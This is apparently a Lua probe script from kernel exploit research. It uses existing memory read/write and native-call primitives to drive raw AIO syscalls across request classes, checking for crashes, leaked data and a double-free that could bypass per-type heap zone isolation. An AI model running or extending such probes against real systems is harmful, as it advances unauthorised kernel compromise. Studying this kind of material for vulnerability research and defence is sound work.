-- CRASH_CLASS: HIGH
-- PROBE 69c: AIO class=2 and class=3 full lifecycle + double-free
--
-- GAP A from verification: ALL 30+ AIO probes use class=1 exclusively.
-- 669 accepts class 1-3. Different classes may:
--   - Allocate from different kernel zones
--   - Use different completion paths / readback fields
--   - Free different sub-objects in 662
-- If class=2/3 uses a zone shared with other subsystems, it bypasses
-- the per-type zone isolation that killed cross-spray.
--
-- Also tests AIO cmd=2 (write) which has never been used (GAP B).

print("=== PROBE 69c: AIO class parameter lifecycle ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Ignore signals
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Open /dev/zero for reads, create socketpair for writes
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local sp_buf = memory.alloc(16)
wd(N(sp_buf), 0xFFFF); wd(N(sp_buf) + 4, 0xFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_buf))) end)
local sp0 = rd(N(sp_buf)) or 0xFFFF
local sp1 = rd(N(sp_buf) + 4) or 0xFFFF
print("socketpair: " .. sp0 .. ", " .. sp1)

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

-- Get sys 624 VM-op counter
local function get_624()
    local ret = -1
    pcall(function() ret = N(mk(624)()) end)
    return ret
end

local function submit_one(cmd, fd, cls)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    local ret = -999
    pcall(function()
        ret = N(mk(669)(uint64(cmd), uint64(N(reqs)), uint64(1), uint64(cls), uint64(N(one_id))))
    end)
    return rd(N(one_id)) or 0, ret
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xDEAD
end

local function wait_one(id)
    wd(N(one_id), id)
    wq(N(one_st), uint64(0xDEADDEAD))
    pcall(function() mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rq(N(one_st))
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xDEAD
end

local function query_667(id)
    local buf = memory.alloc(0x20)
    for i = 0, 0x1C, 4 do wd(N(buf) + i, 0xDEAD) end
    wd(N(one_id), id)
    pcall(function() mk(667)(uint64(N(one_id)), uint64(1), uint64(N(buf))) end)
    return rd(N(buf)), rd(N(buf)+4), rd(N(buf)+8), rd(N(buf)+12)
end

-- [A] Full lifecycle for each class × command combination
print("")
print("[A] Class × Command lifecycle")

for cls = 1, 3 do
    for cmd = 1, 2 do
        if not alive() then
            print("  DEAD")
            break
        end

        local fd = (cmd == 1) and fd_zero or sp0
        local fd_name = (cmd == 1) and "/dev/zero" or "socketpair"

        -- Write some data to socketpair if cmd=2 (write needs data in buffer)
        if cmd == 2 and sp0 ~= 0xFFFF then
            for i = 0, 15 do wd(N(data_buf) + i, 0x41 + i) end
        end

        local c624_before = get_624()
        local id, ret = submit_one(cmd, fd, cls)
        local c624_after = get_624()

        if id == 0 then
            print(string.format("  class=%d cmd=%d fd=%s: FAILED (ret=%d, id=0)", cls, cmd, fd_name, ret))
        else
            local pst = poll_one(id)
            local wst = wait_one(id)
            local e1, e2, e3, e4 = query_667(id)
            local dst = delete_one(id)
            print(string.format("  class=%d cmd=%d fd=%s: id=0x%X ret=%d poll=0x%X 663=%s 667=[%X,%X,%X,%X] del=0x%X d624=%d",
                cls, cmd, fd_name, id, ret, pst, fmt(wst),
                e1 or 0, e2 or 0, e3 or 0, e4 or 0, dst,
                c624_after - c624_before))
        end
    end
end

if not alive() then
    print("DEAD after lifecycle")
    print("=== 69c COMPLETE (CRASH) ===")
    return
end

-- [B] Batch submit: classes 1,2,3 × count 1-4
print("")
print("[B] Batch submit with count > 1 per class")

for cls = 1, 3 do
    for cnt = 1, 4 do
        if not alive() then break end

        local ids_buf = memory.alloc(cnt * 4 + 8)
        for i = 0, cnt - 1 do wd(N(ids_buf) + i * 4, 0) end

        local multi_reqs = memory.alloc(0x28 * cnt + 0x10)
        for i = 0, cnt - 1 do
            local base = N(multi_reqs) + i * 0x28
            wq(base, uint64(0))
            wq(base + 8, uint64(16))
            local bh, bl = get_hi_lo(uint64(N(data_buf)))
            wd(base + 0x10, bl); wd(base + 0x14, bh)
            local rh, rl = get_hi_lo(uint64(N(result_buf)))
            wd(base + 0x18, rl); wd(base + 0x1C, rh)
            wd(base + 0x20, fd_zero); wd(base + 0x24, 0)
        end

        local ret = -999
        pcall(function()
            ret = N(mk(669)(uint64(1), uint64(N(multi_reqs)), uint64(cnt), uint64(cls), uint64(N(ids_buf))))
        end)

        local ids_str = ""
        for i = 0, cnt - 1 do
            local id = rd(N(ids_buf) + i * 4) or 0
            if i > 0 then ids_str = ids_str .. "," end
            ids_str = ids_str .. string.format("0x%X", id)
        end

        print(string.format("  class=%d count=%d: ret=%d ids=[%s]", cls, cnt, ret, ids_str))

        -- Clean up
        for i = 0, cnt - 1 do
            local id = rd(N(ids_buf) + i * 4) or 0
            if id ~= 0 then
                poll_one(id)
                delete_one(id)
            end
        end
    end
end

if not alive() then
    print("DEAD after batch")
    print("=== 69c COMPLETE (CRASH) ===")
    return
end

-- [C] sys 665 aio_get_data with valid IDs (NEVER TESTED)
print("")
print("[C] sys 665 (aio_get_data) with valid AIO IDs")

local out_665 = memory.alloc(0x100)

for cls = 1, 3 do
    if not alive() then break end

    local id, ret = submit_one(1, fd_zero, cls)
    if id ~= 0 then
        poll_one(id)

        -- Fill output buffer with sentinels
        for i = 0, 0xFC, 4 do wd(N(out_665) + i, 0xDEADDEAD) end

        -- Try various arg layouts for 665
        for shape = 1, 4 do
            local r665 = -999
            if shape == 1 then
                pcall(function() r665 = sgn(mk(665)(uint64(id), uint64(N(out_665)), uint64(0x100))) end)
            elseif shape == 2 then
                pcall(function() r665 = sgn(mk(665)(uint64(id), uint64(N(out_665)), uint64(0x100), uint64(0), uint64(0), uint64(0))) end)
            elseif shape == 3 then
                pcall(function() r665 = sgn(mk(665)(uint64(N(one_id)), uint64(1), uint64(N(out_665)), uint64(0x100))) end)
                wd(N(one_id), id)
            elseif shape == 4 then
                pcall(function() r665 = sgn(mk(665)(uint64(id))) end)
            end

            if not alive() then
                print(string.format("  class=%d id=0x%X shape=%d: KILLED", cls, id, shape))
                break
            end

            -- Check if output buffer changed
            local changed = 0
            local first_val = nil
            for i = 0, 0xFC, 4 do
                local v = rd(N(out_665) + i)
                if v ~= nil and v ~= 0xDEADDEAD then
                    changed = changed + 1
                    if not first_val then first_val = v end
                end
            end

            if changed > 0 or r665 ~= -999 then
                print(string.format("  class=%d id=0x%X shape=%d: ret=%d changed=%d dwords first=0x%X",
                    cls, id, shape, r665, changed, first_val or 0))
                -- Hexdump first 32 bytes if anything changed
                if changed > 0 then
                    local hex = "    "
                    for i = 0, 28, 4 do
                        hex = hex .. string.format("%08X ", rd(N(out_665) + i) or 0)
                    end
                    print(hex)
                end
            else
                print(string.format("  class=%d id=0x%X shape=%d: ret=%d (no change)", cls, id, shape, r665))
            end

            -- Reset sentinels
            for i = 0, 0xFC, 4 do wd(N(out_665) + i, 0xDEADDEAD) end
        end

        if alive() then delete_one(id) end
    else
        print(string.format("  class=%d: submit failed", cls))
    end
end

-- Clean up
pcall(function() mk(6)(uint64(sp0)) end)
pcall(function() mk(6)(uint64(sp1)) end)

print("")
print("=== PROBE 69c COMPLETE ===")
